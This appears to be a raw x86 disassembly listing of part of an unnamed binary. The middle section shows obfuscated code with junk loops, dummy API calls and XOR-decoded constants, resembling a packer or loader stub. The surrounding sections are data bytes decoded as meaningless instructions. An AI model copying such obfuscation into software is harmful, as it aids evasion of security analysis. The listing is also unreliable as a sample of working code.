  41e08d:	sbb    DWORD PTR [ecx],0x69
  41e090:	and    al,0x2b
  41e092:	add    DWORD PTR [ebp-0x4e],eax
  41e095:	packuswb mm6,mm0
  41e098:	push   esi
  41e099:	outs   dx,BYTE PTR ds:[esi]
  41e09a:	dec    ebx
  41e09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e09c:	mov    ebx,0xca151fb4
  41e0a1:	les    edi,FWORD PTR [esi]
  41e0a3:	or     eax,0x36aa4090
  41e0a8:	retf   
  41e0a9:	in     al,dx
  41e0aa:	into   
  41e0ab:	sahf   
  41e0ac:	sbb    dh,BYTE PTR [esi-0x78]
  41e0af:	outs   dx,BYTE PTR ds:[esi]
  41e0b0:	jmp    0x41e0c6
  41e0b2:	mov    ecx,0xd5d320ba
  41e0b7:	xchg   ecx,eax
  41e0b8:	test   eax,0xd46ad0ec
  41e0bd:	pop    ecx
  41e0be:	xor    eax,0xb424e80b
  41e0c3:	fldcw  WORD PTR [ebx]
  41e0c5:	cmp    DWORD PTR ds:0x16638bf5,edi
  41e0cb:	and    ebx,DWORD PTR [ecx]
  41e0cd:	iret   
  41e0ce:	xchg   ebp,eax
  41e0cf:	cmc    
  41e0d0:	aad    0x49
  41e0d2:	nop
  41e0d3:	and    eax,0xad65c66a
  41e0d8:	test   eax,0x1edf3bd0
  41e0dd:	cmc    
  41e0de:	adc    DWORD PTR [esi-0x5d],ecx
  41e0e1:	aad    0x5c
  41e0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0e4:	in     al,dx
  41e0e5:	ret    
  41e0e6:	and    eax,0x7fd32195
  41e0eb:	lods   eax,DWORD PTR ds:[esi]
  41e0ec:	xchg   esp,ecx
  41e0ee:	xchg   edi,eax
  41e0ef:	and    al,BYTE PTR [ecx-0x216bce4b]
  41e0f5:	jno    0x41e0ec
  41e0f7:	and    al,0x97
  41e0f9:	enter  0x89c1,0x77
  41e0fd:	sub    ah,BYTE PTR [edi]
  41e0ff:	mov    WORD PTR [ecx-0x5ce22076],?
  41e105:	add    al,0x5b
  41e107:	lds    ebp,FWORD PTR [ecx]
  41e109:	mov    eax,ds:0x75a90683
  41e10e:	das    
  41e10f:	aam    0x49
  41e111:	ss scas al,BYTE PTR es:[edi]
  41e113:	adc    al,0x4c
  41e115:	or     bl,BYTE PTR [esi+0x2670545b]
  41e11b:	xor    ebp,DWORD PTR [esi-0x14f810ec]
  41e121:	pop    esi
  41e122:	pop    edx
  41e123:	mov    ebx,DWORD PTR [edi+0x48e5ab87]
  41e129:	ins    BYTE PTR es:[edi],dx
  41e12a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e12b:	nop
  41e12c:	jnp    0x41e0f5
  41e12e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e12f:	mul    BYTE PTR [edi]
  41e131:	sbb    al,0x52
  41e133:	pop    ebp
  41e134:	and    dl,cl
  41e136:	(bad)  
  41e137:	lea    edx,[edi-0x7ea8eccc]
  41e13d:	sub    eax,DWORD PTR [edi+edx*2-0x77]
  41e141:	rcl    BYTE PTR [edx],cl
  41e143:	add    eax,0x6cebf2f5
  41e148:	sub    al,0xbe
  41e14a:	pop    ecx
  41e14b:	inc    edx
  41e14c:	jecxz  0x41e1b9
  41e14e:	aam    0x1e
  41e150:	lea    edx,[edi+0x4d]
  41e153:	lods   al,BYTE PTR ds:[esi]
  41e154:	out    dx,al
  41e155:	push   edi
  41e156:	add    dl,BYTE PTR [edx]
  41e158:	mov    al,al
  41e15a:	xor    eax,0x819ebd5a
  41e15f:	test   eax,0xdd571560
  41e164:	fs dec esp
  41e166:	fisubr DWORD PTR ds:0x1db4c9b4
  41e16c:	leave  
  41e16d:	stos   DWORD PTR es:[edi],eax
  41e16e:	or     ch,bl
  41e170:	add    esp,esi
  41e172:	(bad)  
  41e173:	add    al,0xcb
  41e175:	xor    ah,0xcc
  41e178:	jno    0x41e133
  41e17a:	dec    ebx
  41e17b:	jbe    0x41e1db
  41e17d:	push   esp
  41e17e:	jns    0x41e10b
  41e180:	push   es
  41e181:	inc    edi
  41e182:	xchg   edx,eax
  41e183:	or     al,0xd4
  41e185:	mov    ds:0x5df31a15,al
  41e18a:	ja     0x41e1f6
  41e18c:	out    dx,eax
  41e18d:	outs   dx,DWORD PTR ds:[esi]
  41e18e:	mov    bh,0xc5
  41e190:	inc    edi
  41e191:	lea    esp,[edi]
  41e193:	push   edx
  41e194:	dec    esp
  41e195:	jne    0x41e1e4
  41e197:	mov    cl,0x19
  41e199:	test   eax,0x1d5a2a4d
  41e19e:	ds retf 0x6e0c
  41e1a2:	test   eax,0x1fae9331
  41e1a7:	mov    ds:0x1413dc9d,al
  41e1ac:	mov    esi,0xb4dba216
  41e1b1:	mov    ds,WORD PTR [ecx+edx*8+0x4fa65c49]
  41e1b8:	add    eax,0x8e6967c2
  41e1bd:	lods   eax,DWORD PTR ds:[esi]
  41e1be:	or     bl,cl
  41e1c0:	mov    DWORD PTR [edx+esi*4-0x38cdd51d],0xb4c82958
  41e1cb:	or     BYTE PTR [ebp+0x7a],dl
  41e1ce:	mov    esi,0x9cb739a8
  41e1d3:	adc    al,0xe1
  41e1d5:	mov    ch,0x41
  41e1d7:	scas   eax,DWORD PTR es:[edi]
  41e1d8:	pop    ebp
  41e1d9:	pop    ebp
  41e1da:	jg     0x41e1c7
  41e1dc:	(bad)  
  41e1dd:	(bad)  
  41e1de:	int    0xbd
  41e1e0:	(bad)  
  41e1e1:	retf   0xf57c
  41e1e4:	sbb    edx,DWORD PTR [edx-0x125798b5]
  41e1ea:	jmp    0xd81d:0x11a53908
  41e1f1:	mov    al,ds:0x78af452c
  41e1f6:	fst    QWORD PTR [esi-0x1eadb2f9]
  41e1fc:	sbb    esi,DWORD PTR [edx+ebp*4-0x20993bef]
  41e203:	call   0xe06f7fa3
  41e208:	daa    
  41e209:	pop    edi
  41e20a:	ja     0x41e221
  41e20c:	jl     0x41e1f1
  41e20e:	adc    al,0xd6
  41e210:	or     dh,BYTE PTR [ebp-0x8ddd2c2]
  41e216:	out    0x4d,eax
  41e218:	loop   0x41e289
  41e21a:	dec    edx
  41e21b:	scas   eax,DWORD PTR es:[edi]
  41e21c:	push   0xffffffff
  41e21e:	push   ss
  41e21f:	mov    eax,ds:0x903d210c
  41e224:	sbb    BYTE PTR [edi+edi*1],cl
  41e227:	mov    fs,WORD PTR [esi]
  41e229:	inc    edi
  41e22a:	xor    esi,ebx
  41e22c:	fisub  DWORD PTR [esi+0x7c]
  41e22f:	push   ds
  41e230:	iret   
  41e231:	push   0x54dc460c
  41e236:	das    
  41e237:	xchg   ecx,eax
  41e238:	and    BYTE PTR [esi+edx*1-0x3d],dl
  41e23c:	xor    DWORD PTR [eax],0xffffffbc
  41e23f:	shr    DWORD PTR [eax],1
  41e241:	addr16 jne 0x41e232
  41e244:	xchg   ebx,eax
  41e245:	loop   0x41e25d
  41e247:	pop    ebp
  41e248:	jg     0x41e2a1
  41e24a:	push   esp
  41e24b:	lahf   
  41e24c:	fdiv   DWORD PTR [esi-0x6]
  41e24f:	or     eax,0x2067b72
  41e254:	sti    
  41e255:	into   
  41e256:	lahf   
  41e257:	sbb    DWORD PTR [edx+0x40],edx
  41e25a:	xchg   ecx,eax
  41e25b:	mov    esp,0xf7894134
  41e260:	fnstenv [edi]
  41e262:	fild   DWORD PTR [ecx-0x67a7692f]
  41e268:	rol    BYTE PTR [eax+0x1e8335a6],1
  41e26e:	mov    eax,ds:0xd57d2127
  41e273:	aas    
  41e274:	ret    
  41e275:	add    ebp,ebx
  41e277:	ds xor eax,0x6cf1b7b9
  41e27d:	div    BYTE PTR [edx+eiz*2]
  41e280:	scas   al,BYTE PTR es:[edi]
  41e281:	outs   dx,DWORD PTR ds:[esi]
  41e282:	jo     0x41e2e2
  41e284:	das    
  41e285:	fmul   QWORD PTR [esi+0x41]
  41e288:	mov    bh,0x1f
  41e28a:	loopne 0x41e25e
  41e28c:	lods   al,BYTE PTR ds:[esi]
  41e28d:	ret    
  41e28e:	sbb    al,0xa0
  41e290:	gs js  0x41e2c7
  41e293:	sub    BYTE PTR ds:[esi],bh
  41e296:	sub    BYTE PTR [ebp-0x19],ch
  41e299:	mov    edi,0xd3d6f4fa
  41e29e:	add    dl,0x4f
  41e2a1:	rol    ah,0x4a
  41e2a4:	sbb    bl,BYTE PTR [ecx]
  41e2a6:	mov    ebx,0xfddbc12c
  41e2ab:	std    
  41e2ac:	add    BYTE PTR [esi],bh
  41e2ae:	mov    al,ds:0x21aa27aa
  41e2b3:	or     BYTE PTR [edx+edx*1+0x5f6b4039],dh
  41e2ba:	fisttp QWORD PTR [edx-0x26]
  41e2bd:	test   ecx,ebp
  41e2bf:	push   edx
  41e2c0:	data16 aaa 
  41e2c2:	mov    ebx,0x2383508
  41e2c7:	aad    0xab
  41e2c9:	inc    ebx
  41e2ca:	push   ecx
  41e2cb:	add    eax,0xf1fe09f5
  41e2d0:	sub    dl,bl
  41e2d2:	add    al,0x9e
  41e2d4:	(bad)  
  41e2d5:	cli    
  41e2d6:	mov    esp,0xe54fdcde
  41e2db:	mov    ds:0xfb8d0319,al
  41e2e0:	repz add eax,0xc577e3bd
  41e2e6:	push   ebx
  41e2e7:	ds fsub st,st(1)
  41e2eb:	fisubr WORD PTR [ebx+0x73]
  41e2ee:	js     0x41e2fd
  41e2f0:	xor    ebx,DWORD PTR [esi]
  41e2f2:	repz mov ch,0xc0
  41e2f5:	xchg   esp,eax
  41e2f6:	jecxz  0x41e29d
  41e2f8:	add    ch,cl
  41e2fa:	cld    
  41e2fb:	call   0x5746cdd9
  41e300:	push   0x1d
  41e302:	inc    edx
  41e303:	cs cmp eax,0x5d6eed4c
  41e309:	call   0x854b:0xb57ef18a
  41e310:	push   ss
  41e311:	cmp    eax,0x6edbb1d2
  41e316:	mov    esp,DWORD PTR [ebx-0x42a82511]
  41e31c:	jecxz  0x41e33a
  41e31e:	or     cl,BYTE PTR [ebp-0x14]
  41e321:	lahf   
  41e322:	std    
  41e323:	nop
  41e324:	ins    BYTE PTR es:[edi],dx
  41e325:	mov    edx,0xcf2833ad
  41e32a:	inc    esi
  41e32b:	loopne 0x41e3a2
  41e32d:	ds mov eax,0x325c539d
  41e333:	inc    BYTE PTR [ebx]
  41e335:	cld    
  41e336:	sub    ebx,DWORD PTR [edx-0x28]
  41e339:	add    edx,DWORD PTR [edi-0x3b]
  41e33c:	js     0x41e334
  41e33e:	add    dl,BYTE PTR [ebp-0x7378ee42]
  41e344:	adc    bh,dh
  41e346:	pop    esi
  41e347:	int3   
  41e348:	push   edi
  41e349:	lods   al,BYTE PTR ds:[esi]
  41e34a:	rol    edx,0x3b
  41e34d:	and    BYTE PTR [edx],ch
  41e34f:	test   cl,0xc7
  41e352:	arpl   WORD PTR [ebx],bx
  41e354:	pop    edi
  41e355:	push   ecx
  41e356:	jns    0x41e2d8
  41e358:	push   eax
  41e359:	cmp    BYTE PTR cs:[edi+0x33],0xaf
  41e35e:	ret    0x7e0f
  41e361:	imul   edx,ebp,0x4c
  41e364:	imul   eax,DWORD PTR [edx-0x45794c7e],0x69
  41e36b:	fbstp  TBYTE PTR [eax]
  41e36d:	dec    esi
  41e36e:	fstp   QWORD PTR ds:0xe456bca3
  41e374:	out    dx,al
  41e375:	dec    edi
  41e376:	jae    0x41e355
  41e378:	xchg   BYTE PTR [edi-0x37],dh
  41e37b:	leave  
  41e37c:	lock ins DWORD PTR es:[edi],dx
  41e37e:	pop    eax
  41e37f:	pop    ss
  41e380:	outs   dx,BYTE PTR ds:[esi]
  41e381:	sub    dh,BYTE PTR [edi+0x3f]
  41e384:	loope  0x41e39c
  41e386:	sar    bl,0x48
  41e389:	pop    es
  41e38a:	sub    BYTE PTR [esi+0x39c61f54],bl
  41e390:	(bad)  
  41e391:	and    ax,0xd1a3
  41e395:	sub    DWORD PTR [esi],ebx
  41e397:	jns    0x41e36d
  41e399:	add    al,0x27
  41e39b:	pop    ds
  41e39c:	mov    bl,0xaa
  41e39e:	in     eax,0xda
  41e3a0:	jae    0x41e373
  41e3a2:	xchg   BYTE PTR [edx],ch
  41e3a4:	test   BYTE PTR [edx+edi*1-0x37],0x64
  41e3a9:	xchg   edx,eax
  41e3aa:	xor    ah,dl
  41e3ac:	pop    edi
  41e3ad:	push   eax
  41e3ae:	jno    0x41e3fd
  41e3b0:	add    esi,DWORD PTR [ebx-0xde6bf13]
  41e3b6:	stos   DWORD PTR es:[edi],eax
  41e3b7:	in     eax,0xa2
  41e3b9:	call   0x952d:0x9bea0a86
  41e3c0:	bound  edi,QWORD PTR [edi-0x46]
  41e3c3:	ficomp WORD PTR [ebx-0x499b2b99]
  41e3c9:	lods   eax,DWORD PTR ds:[esi]
  41e3ca:	mov    DWORD PTR [edi],0x83f0371a
  41e3d0:	sbb    DWORD PTR [esi+0x24],0xa8a1493a
  41e3d7:	es sbb bh,0x8e
  41e3db:	or     BYTE PTR [edi+0x48],0xd9
  41e3df:	aad    0xc3
  41e3e1:	adc    edi,eax
  41e3e3:	out    0x73,eax
  41e3e5:	je     0x41e37b
  41e3e7:	xor    dl,BYTE PTR [ebp+eax*4-0x72]
  41e3eb:	in     al,dx
  41e3ec:	mov    esi,0x8bda29dd
  41e3f1:	jmp    0x19fd6c19
  41e3f6:	lods   eax,DWORD PTR ds:[esi]
  41e3f7:	sbb    al,0xac
  41e3f9:	mov    ds,WORD PTR [ebp+0x48cb9db8]
  41e3ff:	mov    edx,0x89d67288
  41e404:	inc    ebp
  41e405:	loopne 0x41e3ce
  41e407:	add    eax,0x429028
  41e40c:	push   ds
  41e40d:	add    BYTE PTR [eax],al
  41e40f:	add    BYTE PTR [ebx+0x4290283d],al
  41e415:	add    BYTE PTR [eax],al
  41e417:	je     0x41e45f
  41e41d:	cmp    DWORD PTR ds:0x429028,0x2e
  41e424:	jne    0x41e43f
  41e42a:	push   0x88e3
  41e42f:	push   0x5900
  41e434:	push   0x6949
  41e439:	call   DWORD PTR ds:0x425044
  41e43f:	mov    eax,ds:0x429028
  41e444:	dec    eax
  41e445:	mov    ds:0x429028,eax
  41e44a:	jmp    0x41e410
  41e44f:	mov    eax,ds:0x424549
  41e454:	mov    ecx,DWORD PTR ds:0x423de6
  41e45a:	sub    ecx,eax
  41e45c:	or     eax,DWORD PTR [eax+ecx*1]
  41e45f:	mov    eax,ds:0x424022
  41e464:	mov    eax,DWORD PTR [eax]
  41e466:	mov    DWORD PTR [ebp-0x28],eax
  41e469:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  41e470:	mov    eax,DWORD PTR [ebp-0x38]
  41e473:	mov    DWORD PTR ds:0x42b004,0x13
  41e47d:	cmp    DWORD PTR ds:0x42b004,0x0
  41e484:	je     0x41e4fb
  41e48a:	cmp    DWORD PTR ds:0x42b004,0x19
  41e491:	jne    0x41e4ad
  41e497:	push   0x8602
  41e49c:	push   DWORD PTR [ebp-0x28]
  41e49f:	push   DWORD PTR [ebp-0x18]
  41e4a2:	push   0x5ed1
  41e4a7:	call   DWORD PTR ds:0x425048
  41e4ad:	mov    ecx,DWORD PTR ds:0x42b004
  41e4b3:	dec    ecx
  41e4b4:	mov    DWORD PTR ds:0x42b004,ecx
  41e4ba:	jmp    0x41e47d
  41e4bf:	and    DWORD PTR ds:0x42d010,0x0
  41e4c9:	mov    ecx,DWORD PTR ds:0x42d010
  41e4cf:	inc    ecx
  41e4d0:	mov    DWORD PTR ds:0x42d010,ecx
  41e4d6:	cmp    DWORD PTR ds:0x42d010,0x1d
  41e4dd:	jne    0x41e4ee
  41e4e3:	push   0x7e2c
  41e4e8:	call   DWORD PTR ds:0x42504c
  41e4ee:	cmp    DWORD PTR ds:0x42d010,0x1c
  41e4f5:	jb     0x41e4c9
  41e4fb:	xor    eax,esi
  41e4fd:	and    DWORD PTR ds:0x429008,0x0
  41e507:	jmp    0x41e519
  41e50c:	mov    ecx,DWORD PTR ds:0x429008
  41e512:	inc    ecx
  41e513:	mov    DWORD PTR ds:0x429008,ecx
  41e519:	cmp    DWORD PTR ds:0x429008,0x14
  41e520:	jae    0x41e568
  41e526:	cmp    DWORD PTR ds:0x429008,0xb
  41e52d:	jne    0x41e543
  41e533:	push   0x3d49
  41e538:	push   0x424329
  41e53d:	call   DWORD PTR ds:0x425010
  41e543:	cmp    DWORD PTR ds:0x429008,0xa
  41e54a:	jne    0x41e55d
  41e550:	mov    ecx,DWORD PTR ds:0x429008
  41e556:	inc    ecx
  41e557:	mov    DWORD PTR ds:0x429008,ecx
  41e55d:	jmp    0x41e50c
  41e562:	and    ecx,0x72e7
  41e568:	add    eax,edi
  41e56a:	xor    DWORD PTR ds:0x42c010,0x649e
  41e574:	mov    DWORD PTR [ebp-0x30],eax
  41e577:	mov    ecx,DWORD PTR ds:0x429028
  41e57d:	xor    DWORD PTR ds:0x42b018,ecx
  41e583:	mov    eax,ds:0x423f9a
  41e588:	sbb    ecx,0x5dc9
  41e58e:	mov    DWORD PTR [ebp-0x30],eax
  41e591:	sub    eax,eax
  41e593:	mov    eax,DWORD PTR [ebp-0x20]
  41e596:	mov    DWORD PTR [ebp-0x14],eax
  41e599:	mov    eax,DWORD PTR [ebp-0x14]
  41e59c:	push   0x4
  41e59e:	not    ecx
  41e5a0:	pop    ecx
  41e5a1:	adc    DWORD PTR ds:0x42a004,0x37d1
  41e5ab:	sub    ecx,eax
  41e5ad:	add    ecx,DWORD PTR [ebp-0x28]
  41e5b0:	mov    eax,ds:0x429024
  41e5b5:	or     DWORD PTR ds:0x42a008,eax
  41e5bb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41e5c2:	mov    DWORD PTR ds:0x42a008,0x13
  41e5cc:	cmp    DWORD PTR ds:0x42a008,0x0
  41e5d3:	je     0x41e627
  41e5d9:	cmp    DWORD PTR ds:0x42a008,0x9
  41e5e0:	jne    0x41e5f6
  41e5e6:	push   0x665a
  41e5eb:	push   0x4c85
  41e5f0:	call   DWORD PTR ds:0x425018
  41e5f6:	cmp    DWORD PTR ds:0x42a008,0xa
  41e5fd:	jne    0x41e60e
  41e603:	mov    eax,ds:0x42a008
  41e608:	dec    eax
  41e609:	mov    ds:0x42a008,eax
  41e60e:	xor    eax,eax
  41e610:	xor    eax,DWORD PTR ds:0x42a008
  41e616:	dec    eax
  41e617:	mov    ds:0x42a008,eax
  41e61c:	jmp    0x41e5cc
  41e621:	and    DWORD PTR ds:0x42c018,edi
  41e627:	mov    DWORD PTR [ebp-0x24],ecx
  41e62a:	and    DWORD PTR ds:0x42b000,0x4083
  41e634:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  41e63e:	mov    eax,DWORD PTR [ebp-0x14]
  41e641:	sub    DWORD PTR ds:0x429028,0x42c00c
  41e64b:	mov    DWORD PTR [ebp-0x94],eax
  41e651:	mov    DWORD PTR ds:0x429018,0x60a2
  41e65b:	mov    eax,DWORD PTR [ebp-0x24]
  41e65e:	mov    DWORD PTR [ebp-0x90],eax
  41e664:	sub    eax,0x1a7d
  41e669:	mov    eax,DWORD PTR [ebp-0x2c]
  41e66c:	add    DWORD PTR ds:0x429014,0x42b010
  41e676:	xor    eax,esi
  41e678:	add    eax,edi
  41e67a:	or     DWORD PTR ds:0x42a01c,0xdce
  41e684:	mov    DWORD PTR [ebp-0x8c],eax
  41e68a:	xor    DWORD PTR ds:0x42d004,0x42a000
  41e694:	lea    eax,[ebp-0x50]
  41e697:	sub    DWORD PTR ds:0x429020,0x429004
  41e6a1:	mov    DWORD PTR [ebp-0x88],eax
  41e6a7:	sub    DWORD PTR ds:0x429028,0x1657
  41e6b1:	mov    eax,DWORD PTR [ebp-0x98]
  41e6b7:	xor    eax,esi
  41e6b9:	sub    DWORD PTR ds:0x42c01c,0x42d010
  41e6c3:	add    eax,edi
  41e6c5:	mov    DWORD PTR [ebp-0x98],eax
  41e6cb:	and    DWORD PTR ds:0x42d004,0x42b004
  41e6d5:	lea    eax,[ebp-0x98]
  41e6db:	sbb    DWORD PTR ds:0x42d008,0x429018
  41e6e5:	push   eax
  41e6e6:	and    DWORD PTR ds:0x42c004,edi
  41e6ec:	mov    eax,DWORD PTR [ebp+0xc]
  41e6ef:	sub    DWORD PTR ds:0x42b014,0x42a01c
  41e6f9:	xor    eax,esi
  41e6fb:	add    eax,edi
  41e6fd:	sbb    DWORD PTR ds:0x429024,0x42c01c
  41e707:	push   eax
  41e708:	and    eax,DWORD PTR ds:0x42c018
  41e70e:	mov    eax,ds:0x423fba
  41e713:	adc    DWORD PTR ds:0x429004,0x7be0
  41e71d:	push   0x423f10
  41e722:	and    DWORD PTR ds:0x429000,0x42b018
  41e72c:	push   DWORD PTR [eax]
  41e72e:	xor    DWORD PTR ds:0x42c014,0x72b4
  41e738:	call   0x40867e
  41e73d:	inc    eax
  41e73e:	mov    eax,DWORD PTR [ebp-0x14]
  41e741:	add    ecx,DWORD PTR ds:0x42b00c
  41e747:	mov    ecx,DWORD PTR [ebp-0x24]
  41e74a:	mov    DWORD PTR [ebp-0x4c],ecx
  41e74d:	mov    ecx,DWORD PTR [ebp+0x8]
  41e750:	xor    DWORD PTR ds:0x429020,0x42a008
  41e75a:	xor    ecx,esi
  41e75c:	mov    DWORD PTR [ebp-0x38],eax
  41e75f:	xor    DWORD PTR ds:0x42c014,0x42a014
  41e769:	add    ecx,edi
  41e76b:	jmp    0x423b1a
  41e770:	adc    ebx,DWORD PTR ds:0x429018
  41e776:	lea    edx,[ecx+eax*1]
  41e779:	mov    DWORD PTR ds:0x42d000,0x1d
  41e783:	cmp    DWORD PTR ds:0x42d000,0x0
  41e78a:	je     0x41e7ca
  41e790:	cmp    DWORD PTR ds:0x42d000,0x24
  41e797:	jne    0x41e7b0
  41e79d:	push   0x42a008
  41e7a2:	push   DWORD PTR [ebp-0x14]
  41e7a5:	push   0x424345
  41e7aa:	call   DWORD PTR ds:0x42501c
  41e7b0:	xor    ebx,ebx
  41e7b2:	add    ebx,DWORD PTR ds:0x42d000
  41e7b8:	dec    ebx
  41e7b9:	mov    DWORD PTR ds:0x42d000,ebx
  41e7bf:	jmp    0x41e783
  41e7c4:	and    DWORD PTR ds:0x42c010,ecx
  41e7ca:	mov    DWORD PTR [ebp-0x28],edx
  41e7cd:	sub    edx,ebx
  41e7cf:	mov    edx,DWORD PTR [ebp-0x4c]
  41e7d2:	and    DWORD PTR ds:0x42d00c,0x0
  41e7dc:	jmp    0x41e7ee
  41e7e1:	mov    ebx,DWORD PTR ds:0x42d00c
  41e7e7:	inc    ebx
  41e7e8:	mov    DWORD PTR ds:0x42d00c,ebx
  41e7ee:	cmp    DWORD PTR ds:0x42d00c,0x19
  41e7f5:	jae    0x41e843
  41e7fb:	cmp    DWORD PTR ds:0x42d00c,0xe
  41e802:	jne    0x41e818
  41e808:	push   0x42901c
  41e80d:	push   0x4df2
  41e812:	call   DWORD PTR ds:0x425020
  41e818:	cmp    DWORD PTR ds:0x42d00c,0xd
  41e81f:	jne    0x41e834
  41e825:	xor    ebx,ebx
  41e827:	xor    ebx,DWORD PTR ds:0x42d00c
  41e82d:	inc    ebx
  41e82e:	mov    DWORD PTR ds:0x42d00c,ebx
  41e834:	jmp    0x41e7e1
  41e839:	sbb    DWORD PTR ds:0x42d00c,0x42a014
  41e843:	sub    edx,ecx
  41e845:	sbb    DWORD PTR ds:0x429014,ebx
  41e84b:	mov    DWORD PTR [ebp-0x20],edx
  41e84e:	and    DWORD PTR ds:0x42d01c,0x0
  41e858:	mov    edx,DWORD PTR ds:0x42d01c
  41e85e:	inc    edx
  41e85f:	mov    DWORD PTR ds:0x42d01c,edx
  41e865:	cmp    DWORD PTR ds:0x42d01c,0x8
  41e86c:	jne    0x41e87b
  41e872:	push   DWORD PTR [ebp-0x10]
  41e875:	call   DWORD PTR ds:0x425028
  41e87b:	cmp    DWORD PTR ds:0x42d01c,0x7
  41e882:	jne    0x41e897
  41e888:	xor    edx,edx
  41e88a:	or     edx,DWORD PTR ds:0x42d01c
  41e890:	inc    edx
  41e891:	mov    DWORD PTR ds:0x42d01c,edx
  41e897:	cmp    DWORD PTR ds:0x42d01c,0x11
  41e89e:	jb     0x41e858
  41e8a4:	mov    edx,DWORD PTR [ebp-0x20]
  41e8a7:	mov    DWORD PTR [ebp-0x14],edx
  41e8aa:	mov    edx,DWORD PTR [ebp-0x28]
  41e8ad:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  41e8b4:	mov    DWORD PTR [ebp-0x44],edx
  41e8b7:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41e8be:	mov    edx,DWORD PTR [ebp-0x34]
  41e8c1:	xor    edx,esi
  41e8c3:	add    edx,edi
  41e8c5:	mov    DWORD PTR [ebp-0x10],edx
  41e8c8:	mov    edx,DWORD PTR [ebp-0x34]
  41e8cb:	xor    edx,esi
  41e8cd:	add    edx,edi
  41e8cf:	mov    DWORD PTR [ebp-0x8],edx
  41e8d2:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41e8d9:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41e8e0:	mov    edx,DWORD PTR [ebp-0x34]
  41e8e3:	mov    ebx,DWORD PTR [ebp-0x14]
  41e8e6:	xor    edx,esi
  41e8e8:	add    edx,edi
  41e8ea:	cmp    ebx,edx
  41e8ec:	je     0x423b0e
  41e8f2:	mov    eax,DWORD PTR [ebp-0x18]
  41e8f5:	xor    eax,esi
  41e8f7:	mov    edx,0xffcd8d25
  41e8fc:	sub    edx,eax
  41e8fe:	add    edx,DWORD PTR [ebp-0x14]
  41e901:	mov    eax,DWORD PTR [ebp-0x18]
  41e904:	mov    ebx,DWORD PTR [ebp-0x10]
  41e907:	xor    eax,esi
  41e909:	add    eax,edi
  41e90b:	imul   eax,ebx
  41e90e:	cmp    eax,edx
  41e910:	ja     0x423b0b
  41e916:	mov    edx,DWORD PTR [ebp-0x10]
  41e919:	mov    eax,DWORD PTR [ebp-0x14]
  41e91c:	mov    ebx,DWORD PTR [ebp-0x28]
  41e91f:	sub    eax,edx
  41e921:	xor    ebx,esi
  41e923:	xor    edx,edx
  41e925:	add    ebx,edi
  41e927:	div    ebx
  41e929:	mov    DWORD PTR [ebp-0x8],eax
  41e92c:	mov    eax,DWORD PTR [ebp-0x2c]
  41e92f:	mov    edx,DWORD PTR [ebp-0x8]
  41e932:	xor    eax,esi
  41e934:	add    eax,edi
  41e936:	cmp    edx,eax
  41e938:	jbe    0x41e948
  41e93e:	mov    eax,DWORD PTR [ebp-0x2c]
  41e941:	xor    eax,esi
  41e943:	add    eax,edi
  41e945:	mov    DWORD PTR [ebp-0x8],eax
  41e948:	mov    eax,DWORD PTR [ebp-0x28]
  41e94b:	mov    edx,DWORD PTR [ebp-0x8]
  41e94e:	xor    eax,esi
  41e950:	add    eax,edi
  41e952:	imul   eax,edx
  41e955:	mov    DWORD PTR [ebp-0x8],eax
  41e958:	mov    eax,DWORD PTR [ebp-0x34]
  41e95b:	mov    edx,DWORD PTR [ebp-0x8]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    edx,eax
  41e964:	je     0x423af4
  41e96a:	mov    eax,DWORD PTR [ebp-0x8]
  41e96d:	mov    DWORD PTR [ebp-0x24],eax
  41e970:	mov    eax,DWORD PTR [ebp-0x10]
  41e973:	add    eax,DWORD PTR [ebp-0x44]
  41e976:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41e97d:	mov    DWORD PTR [ebp-0x8],eax
  41e980:	mov    eax,0xf89c85b5
  41e985:	mov    DWORD PTR [ebp-0x3c],eax
  41e988:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  41e98f:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  41e996:	mov    DWORD PTR [ebp-0x1c],eax
  41e999:	mov    eax,DWORD PTR [ebp-0x20]
  41e99c:	xor    eax,esi
  41e99e:	add    eax,edi
  41e9a0:	jmp    0x423ab0
  41e9a5:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41e9ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9af:	mov    edx,DWORD PTR [ebp-0xc]
  41e9b2:	xor    eax,esi
  41e9b4:	add    eax,edi
  41e9b6:	imul   eax,edx
  41e9b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9bc:	mov    al,BYTE PTR [eax+edx*1]
  41e9bf:	mov    BYTE PTR [ebp-0x1],al
  41e9c2:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9c5:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c8:	xor    eax,esi
  41e9ca:	add    eax,edi
  41e9cc:	imul   eax,edx
  41e9cf:	mov    edx,DWORD PTR [ebp-0x40]
  41e9d2:	xor    edx,esi
  41e9d4:	add    eax,edx
  41e9d6:	mov    edx,DWORD PTR [ebp-0x8]
  41e9d9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  41e9e1:	jmp    0x420d2f
  41e9e6:	iret   
  41e9e7:	and    edi,DWORD PTR [esi+0x59]
  41e9ea:	(bad)  
  41e9eb:	daa    
  41e9ec:	mov    ds:0x1c7877a3,eax
  41e9f1:	jle    0x41e9ed
  41e9f3:	in     eax,dx
  41e9f4:	jp     0x41e9ab
  41e9f6:	adc    ebx,edx
  41e9f8:	popa   
  41e9f9:	bound  edx,QWORD PTR [ecx+0x5f]
  41e9fc:	bound  esp,QWORD PTR [edx+0x7f]
  41e9ff:	mov    al,0x5a
  41ea01:	mov    dh,0xca
  41ea03:	ins    BYTE PTR es:[edi],dx
  41ea04:	mov    WORD PTR ds:0x463e7b87,?
  41ea0a:	std    
  41ea0b:	outs   dx,BYTE PTR ds:[esi]
  41ea0c:	ja     0x41ea2a
